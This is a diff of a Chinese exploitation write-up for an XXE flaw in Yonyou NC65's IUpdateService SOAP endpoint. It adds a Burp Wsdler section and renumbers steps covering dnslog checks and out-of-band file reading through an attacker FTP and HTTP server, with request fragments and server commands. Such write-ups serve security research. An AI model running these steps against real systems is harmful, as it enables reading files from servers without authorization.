@@ -40,7 +40,7 @@ NC65_Server_home/temp/wsgen/nc/uap/oba/update/IUpdateService.wsdl
 ```
 
 # 0x02 漏洞利用
-## 2.1 `SoapUI` 构造数据包
+## 2.1 `SoapUI` 构造验证数据包
 - 参考链接：SoapUI 简介和入门实例解析
 
 填入工程名和 `WSDL` 地址，`WSDL` 地址为：
@@ -93,8 +93,22 @@ User-Agent: Apache-HttpClient/4.5.5 (Java/16.0.1)
 
 ![image](https://user-images.githubusercontent.com/84888757/223006687-ab55fcca-03dc-4f3f-b509-5e98b13c53e6.png)
 
+## 2.2 burp插件Wsdler构造验证数据包
+有可以替代 `SOAPUI` 的burp插件 `Wsdler` ，在 `Extender` -> `BApp Store` 即可下载。
 
-## 2.2 dnslog验证
+访问 `wsdl` 接口，然后转发到 `Wsdler` 中。
+
+![image](https://user-images.githubusercontent.com/84888757/223066758-13620359-6c99-4f7b-9758-dc2ed50c15b2.png)
+
+到插件 `Wsdler` 里去查看，再转发到 `Repeater` 中进行发送。
+
+![image](https://user-images.githubusercontent.com/84888757/223066816-ca74087d-7fa3-47ce-9fd0-91efab34fda7.png)
+
+![image](https://user-images.githubusercontent.com/84888757/223066851-c640e9b8-f411-49b0-9095-7d05847da874.png)
+
+
+
+## 2.3 dnslog验证
 我们替换为 `xxe` 的 `payload`，用 `dnslog` 证明一下
 ```
 POST http://192.168.50.13:8888/uapws/service/nc.uap.oba.update.IUpdateService HTTP/1.1
@@ -127,8 +141,8 @@ User-Agent: Apache-HttpClient/4.5.5 (Java/16.0.1)
 
 <div align=center ><img width="700" src="https://user-images.githubusercontent.com/84888757/223006871-2b35b2e5-4019-412f-a7c9-512777ade7bc.png" /></div>
 
-## 2.3 文件读取利用
-### 2.3.1 攻击机起一个FTP服务器
+## 2.4 文件读取利用
+### 2.4.1 攻击机起一个FTP服务器
 ```bash
 python3 FtpServer.py
 ```
@@ -175,7 +189,7 @@ if __name__ == '__main__':
 
 <div align=center ><img width="800" src="https://user-images.githubusercontent.com/84888757/223007526-377dc534-07e6-4368-b1bb-363ceff52b2d.png" /></div>
 
-### 2.3.2 攻击机开启一个http服务
+### 2.4.2 攻击机开启一个http服务
 ```bash
 python3 -m http.server 9999
 ```
@@ -194,7 +208,7 @@ python3 -m http.server 9999
 <div align=center ><img width="600" src="https://user-images.githubusercontent.com/84888757/223007831-d55bdf34-2cca-4527-8457-95417165bc05.png" /></div>
 
 
-### 2.3.3 构造 `poc` 去加载 `Evil.xml` 文件
+### 2.4.3 构造 `poc` 去加载 `Evil.xml` 文件
 ```
 POST /uapws/service/nc.uap.oba.update.IUpdateService HTTP/1.1
 Accept-Encoding: gzip,deflate
@@ -221,7 +235,7 @@ User-Agent: Apache-HttpClient/4.5.5 (Java/16.0.1)
 ![image](https://user-images.githubusercontent.com/84888757/223010863-ae921670-d9a7-4829-9501-c456b05f943e.png)
 
 
-### 2.3.4 查看FTP服务监听
+### 2.4.4 查看FTP服务监听
 
 ![image](https://user-images.githubusercontent.com/84888757/223008020-11f51491-d8b8-4e2e-88ba-02d0808e29b1.png)
 
